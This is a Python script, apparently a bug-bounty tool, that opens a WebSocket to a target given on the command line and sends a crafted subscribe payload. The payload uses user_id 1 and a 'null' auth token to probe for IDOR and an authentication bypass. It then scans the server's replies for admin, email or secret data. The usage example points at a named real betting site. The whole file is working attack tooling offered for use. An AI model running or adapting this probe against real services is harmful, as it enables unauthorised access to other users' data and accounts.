import asyncio
import websockets
import json
import sys

# Color formatting variables for scannable terminal readouts
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

if len(sys.argv) < 2:
    print(f"{RED}[-] Error: Missing Target WebSocket URL.{RESET}")
    print("Usage: python3 ws_bounty_hunter.py <ws-or-wss-url>")
    print("Example: python3 ws_bounty_hunter.py wss://://1win.com")
    sys.exit(1)

TARGET_WS_URL = sys.argv[1]

print("==================================================")
print(f"      ASYNC WEBSOCKET EXPLOIT PROBER LOADED       ")
print(f"      Target Node: {TARGET_WS_URL}")
print("==================================================")

async def audit_websocket():
    try:
        # Establish a live, secure connection stream with custom browser headers
        async with websockets.connect(
            TARGET_WS_URL, 
            user_agent_header="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            ssl=True if TARGET_WS_URL.startswith("wss") else False
        ) as ws:
            print(f"\n{GREEN}[+] Connection Established Successfully!{RESET}")
            
            # --- TESTING VECTOR 1: IDOR PARAMETER MANIPULATION ---
            # Simulating a typical chat, score tracking, or session payload parameter
            payload = {
                "action": "subscribe",
                "channel": "user_profile_feed",
                "user_id": 1,          # Fuzzing low-digit root admin ID parameters
                "auth_token": "null"    # Testing if connection permits blank authentication bypasses
            }
            
            print(f"\n{CYAN}[*] Sending Fuzzing Payload Token...{RESET}")
            print(f"    Payload: {json.dumps(payload)}")
            
            # Transmit the payload parameter up to the server node
            await ws.send(json.dumps(payload))
            
            # --- TESTING VECTOR 2: ASYNCHRONOUS DATA MONITORING ---
            print(f"\n{CYAN}[*] Listening for Incoming Server Stream Packets (Timeout: 5s)...{RESET}")
            
            # Read the first 3 consecutive response frames coming from the backend cluster
            for i in range(3):
                try:
                    # Wait up to 5 seconds per frame for the server to reply
                    response = await asyncio.wait_for(ws.recv(), timeout=5.0)
                    print(f"\n  {YELLOW}[Frame {i+1} Received]{RESET} From Server:")
                    
                    # Try to parse the response as JSON for cleaner scannable readability
                    try:
                        parsed_json = json.loads(response)
                        print(json.dumps(parsed_json, indent=4))
                    except json.JSONDecodeError:
                        print(response)
                        
                    # --- SECURITY ANALYSIS CRITERIA ---
                    low_resp = response.lower()
                    if "error" in low_resp or "unauthorized" in low_resp or "forbidden" in low_resp:
                        print(f"  └── {GREEN}[-] State: Protected / Handled secure boundary rules.{RESET}")
                    elif "admin" in low_resp or "email" in low_resp or "secret" in low_resp:
                        print(f"  └── {RED}[CRITICAL BUG VECTOR] High Signal Info Disclosure Detected!{RESET}")
                        print(f"      └── Action: Review leaked metadata fields instantly for your report.")
                        
                except asyncio.TimeoutError:
                    print(f"\n  [-] Frame {i+1}: Stream connection timed out. No response frame sent from backend.")
                    break
                    
    except Exception as e:
        print(f"\n{RED}[-] Network Connection Exception Failure:{RESET} {str(e)}")
        print(f"  └── {YELLOW}Note: Check if target URL requires custom paths or specific Upgrade handshake formats.{RESET}")

# Initialize the asynchronous execution routine loops
asyncio.run(audit_websocket())
print("\n==================================================\n")

